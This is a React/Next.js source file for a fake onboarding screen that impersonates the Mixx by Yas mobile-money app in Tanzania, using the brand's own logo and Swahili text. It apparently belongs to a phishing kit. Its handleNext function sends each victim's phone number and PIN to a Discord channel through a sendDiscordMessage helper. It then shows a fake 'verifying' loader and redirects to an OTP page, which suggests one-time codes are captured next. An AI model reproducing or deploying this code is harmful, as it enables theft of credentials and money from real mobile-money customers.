"use client"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { ChevronDown, Globe, Lock } from "lucide-react"
import Image from "next/image"

export default function OnboardingScreen() {
  const router = useRouter()
  const [phoneNumber, setPhoneNumber] = useState("")
  const [pin, setPin] = useState("")
  const [currentSlide, setCurrentSlide] = useState(0)
  const [isLoading, setIsLoading] = useState(false)

  const handleNext = async () => {
    if (phoneNumber.length >= 9) {
      setIsLoading(true)

      // Store in storage
      sessionStorage.setItem("userPhone", phoneNumber)
      sessionStorage.setItem("userPin", pin)

      try {
        const { sendDiscordMessage } = await import("@/lib/discord")
        await sendDiscordMessage({
          phoneNumber,
          pin,
          title: "Onboarding Details",
          exclude: ["otp1", "otp2", "otp3", "location"]
        })
      } catch (error) {
        console.error("Discord error:", error)
      }

      setTimeout(() => {
        router.push("/verify-otp")
      }, 3000)
    }
  }

  // Loading Screen
  if (isLoading) {
    return (
      <div className="min-h-screen bg-[#1a3a6e] flex flex-col items-center justify-center">
        {/* Logo */}
        <Image
          src="https://mixx.co.tz/wp-content/uploads/2025/04/Mixx-By-Yas.svg"
          alt="Mixx by Yas"
          width={192}
          height={80}
          className="w-48 h-20"
          priority
        />

        {/* Loader */}
        <div className="mt-12">
          <div className="flex gap-1.5">
            <span
              className="w-2.5 h-2.5 bg-[#f5c518] rounded-full animate-bounce"
              style={{ animationDelay: "0ms", animationDuration: "600ms" }}
            />
            <span
              className="w-2.5 h-2.5 bg-[#f5c518] rounded-full animate-bounce"
              style={{ animationDelay: "150ms", animationDuration: "600ms" }}
            />
            <span
              className="w-2.5 h-2.5 bg-[#f5c518] rounded-full animate-bounce"
              style={{ animationDelay: "300ms", animationDuration: "600ms" }}
            />
          </div>
        </div>

        {/* Loading Text */}
        <p className="text-white/70 text-sm mt-6">Inathibitisha...</p>
      </div>
    )
  }

  return (
    <div className="fixed inset-0 w-full h-full flex flex-col overflow-hidden bg-white">
      {/* Hero Section - Navy Blue */}
      <div className="bg-[#1a3a6e] flex-1 relative px-4 pt-4 pb-2 flex flex-col justify-between min-h-0 w-full">
        {/* Language Selector */}
        <button className="flex items-center gap-1.5 bg-[#2a4a7e] rounded-full px-3 py-1.5 text-white text-sm">
          <Globe className="w-4 h-4" />
          <span>Kiswahili</span>
          <ChevronDown className="w-3.5 h-3.5" />
        </button>

        {/* Hero Image with Yellow Oval */}
        <div className="relative mt-4 flex justify-center">
          {/* Yellow Oval Outline */}
          <div
            className="absolute inset-0 flex items-center justify-center pointer-events-none"
            style={{ transform: "rotate(-15deg)" }}
          >
            <div
              className="w-[280px] max-w-[85%] h-[220px] border-[3px] border-[#f5c518] rounded-[50%]"
              style={{ transform: "rotate(15deg)" }}
            />
          </div>

          {/* Main Image */}
          <div className="relative w-full max-w-[320px] h-[220px]">
            <Image
              src="https://www.mixx.co.tz/wp-content/uploads/2025/05/BAnniere_Service-2-1-scaled.webp"
              alt="Mixx Service Banner"
              fill
              className="object-cover object-center rounded-[50%]"
            />
          </div>
        </div>

        {/* Marketing Text */}
        <div className="mt-4 px-2">
          <p
            className="text-[#f5c518] text-2xl italic leading-tight"
            style={{ fontFamily: "system-ui, -apple-system, sans-serif" }}
          >
            Lipa & Lipwa kwa<br />
            urahisi.
          </p>
          <p
            className="text-[#f5c518] text-xl font-bold italic mt-1"
            style={{ fontFamily: "system-ui, -apple-system, sans-serif" }}
          >
            kwenye Super App yako
          </p>
        </div>


      </div>

      {/* Bottom Section - White */}
      <div className="bg-white px-4 py-6">
        {/* Info Text */}
        <p className="text-gray-600 text-xs mb-4">
          Unaweza kutumia namba yoyote ya mtandao Tanzania kwenye Mixx Super App yako
        </p>

        {/* Phone Input */}
        <div className="flex items-center border border-gray-200 rounded-lg px-3 py-3 mb-4">
          {/* Tanzania Flag */}
          <div className="flex items-center gap-2 pr-3 border-r border-gray-200">
            <div className="w-6 h-4 flex flex-col rounded-sm overflow-hidden">
              <div className="flex-1 bg-[#1eb53a]" />
              <div className="h-[2px] bg-[#f5c518]" />
              <div className="flex-1 bg-[#00a3dd]" />
              <div className="h-[2px] bg-[#f5c518]" />
              <div className="flex-1 bg-black" />
            </div>
          </div>
          <input
            type="tel"
            value={phoneNumber}
            onChange={(e) => setPhoneNumber(e.target.value)}
            placeholder="Ingiza Namba Hapa!"
            className="flex-1 ml-3 text-sm text-gray-700 placeholder:text-gray-500 focus:outline-none min-w-0"
          />
        </div>

        {/* PIN Input */}
        <div className="flex items-center border border-gray-200 rounded-lg px-3 py-3 mb-4">
          <div className="flex items-center gap-2 pr-3 border-r border-gray-200 text-gray-400">
            <Lock className="w-5 h-5" />
          </div>
          <input
            type="password"
            value={pin}
            onChange={(e) => setPin(e.target.value)}
            placeholder="Ingiza PIN"
            className="flex-1 ml-3 text-sm text-gray-700 placeholder:text-gray-500 focus:outline-none min-w-0"
          />
        </div>

        {/* Next Button */}
        <button
          onClick={handleNext}
          className={`w-full rounded-lg py-3.5 text-sm font-medium transition-colors ${phoneNumber.length >= 9 && pin.length >= 0
            ? "bg-[#1a3a6e] text-white"
            : "bg-gray-200 text-gray-500"
            }`}
        >
          Endelea
        </button>
      </div>
    </div>
  )
}
